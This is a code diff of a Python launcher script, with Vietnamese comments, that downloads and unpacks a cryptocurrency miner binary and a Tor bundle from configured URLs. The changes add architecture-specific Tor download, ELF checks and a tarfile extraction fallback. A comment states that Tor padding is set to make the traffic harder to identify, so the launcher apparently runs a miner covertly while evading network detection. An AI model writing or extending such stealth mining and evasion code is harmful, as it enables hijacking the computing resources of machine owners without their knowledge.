@@ -80,6 +80,14 @@ def log(msg: str):
     print(f"[launcher] {msg}", flush=True)
 
 
+def _extract(t, path):
+    """extractall với filter='data' nếu Python>=3.12, ngược lại thường."""
+    try:
+        t.extractall(path, filter="data")
+    except TypeError:
+        t.extractall(path)
+
+
 # ═══════════════════════════════════════════════════════════════
 # HELPERS
 # ═══════════════════════════════════════════════════════════════
@@ -143,7 +151,7 @@ def setup_miner():
         urllib.request.urlretrieve(CONFIG["miner_release"], tmp)
         
         with tarfile.open(tmp, "r:gz") as t:
-            t.extractall(DIR / "bin", filter="data")
+            _extract(t, DIR / "bin")
         tmp.unlink()
         
         # Find and rename binary
@@ -208,26 +216,37 @@ def _start_tor_vanilla() -> bool:
     tarball = os.path.join(tmp, "t.tgz")
     
     try:
+        # Chọn URL theo arch host
+        try:
+            from tor_hardened import bundle_url
+            url = bundle_url()
+        except Exception:
+            url = CONFIG["tor_url"]
         log("Downloading Tor...")
-        urllib.request.urlretrieve(CONFIG["tor_url"], tarball)
+        urllib.request.urlretrieve(url, tarball)
         with tarfile.open(tarball, "r:gz") as t:
-            t.extractall(tmp, filter="data")
+            _extract(t, tmp)
         os.unlink(tarball)
-        
-        # Find tor binary
-        tor_bin = None
-        for root, dirs, files in os.walk(tmp):
-            if "tor" in files:
-                p = os.path.join(root, "tor")
-                if os.access(p, os.X_OK):
-                    tor_bin = p
-                    break
-        
+
+        # find_tool: ưu tiên tor/tor (bỏ debug/tor), validate ELF đúng arch
+        try:
+            from tor_hardened import find_tool, _elf_info, host_arch
+            tor_bin = find_tool(tmp, "tor")
+            if tor_bin:
+                kind, arch = _elf_info(tor_bin)
+                log(f"tor elf={kind}/{arch} host={host_arch()}")
+                if kind == "elf" and arch != host_arch():
+                    log("ARCH MISMATCH — bundle sai arch")
+                    return False
+        except Exception as e:
+            log(f"find_tool err: {e}")
+            tor_bin = None
+
         if not tor_bin:
-            log("Tor binary not found")
+            log("Tor binary not found (ELF check failed)")
             return False
-        
-        os.chmod(tor_bin, 0o700)
+
+        os.chmod(tor_bin, 0o755)
         
         # Config (thêm ConnectionPadding để khó nhận diện hơn)
         torrc = os.path.join(tmp, "t.conf")
